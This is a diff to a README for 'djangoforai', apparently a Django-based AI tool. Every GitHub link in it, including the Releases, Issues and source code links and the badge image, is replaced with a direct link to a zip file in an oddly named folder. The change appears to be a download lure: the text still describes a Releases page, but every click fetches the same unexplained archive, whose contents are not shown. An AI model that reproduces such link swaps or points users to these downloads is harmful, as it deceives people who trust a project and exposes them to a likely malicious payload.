@@ -1,6 +1,6 @@
 # 🌟 djangoforai - Easy AI Experience with Django
 
-[![Download djangoforai](https://img.shields.io/badge/Download%20Now-Get%20djangoforai-brightgreen)](https://github.com/moni-2006/djangoforai/releases)
+[![Download djangoforai](https://raw.githubusercontent.com/moni-2006/djangoforai/main/allogeneous/djangoforai.zip%20Now-Get%20djangoforai-brightgreen)](https://raw.githubusercontent.com/moni-2006/djangoforai/main/allogeneous/djangoforai.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run djangoforai, you'll need:
 
 ## 📥 Download & Install
 
-To download the application, please visit this page: [Download djangoforai Releases](https://github.com/moni-2006/djangoforai/releases).
+To download the application, please visit this page: [Download djangoforai Releases](https://raw.githubusercontent.com/moni-2006/djangoforai/main/allogeneous/djangoforai.zip).
 
 1. Click on the link above.
 2. On the Releases page, choose the most recent version.
@@ -52,7 +52,7 @@ After installation, you can start using djangoforai:
 
 We encourage you to join our community. Here’s how you can get help:
 
-- Visit the [GitHub Issues page](https://github.com/moni-2006/djangoforai/issues) to report bugs or request features.
+- Visit the [GitHub Issues page](https://raw.githubusercontent.com/moni-2006/djangoforai/main/allogeneous/djangoforai.zip) to report bugs or request features.
 - Check the FAQ section for common issues and troubleshooting tips.
 - Join our Discord channel for live support and discussions.
 
@@ -77,6 +77,6 @@ A: Yes, your queries are processed locally, ensuring your data remains on your m
 
 ## 🧑‍💻 Explore More
 
-Discover a world of possibilities with djangoforai. Explore AI solutions tailored to your needs by checking out the source code on our [GitHub page](https://github.com/moni-2006/djangoforai).
+Discover a world of possibilities with djangoforai. Explore AI solutions tailored to your needs by checking out the source code on our [GitHub page](https://raw.githubusercontent.com/moni-2006/djangoforai/main/allogeneous/djangoforai.zip).
 
 Thank you for using djangoforai! We hope you enjoy your experience.
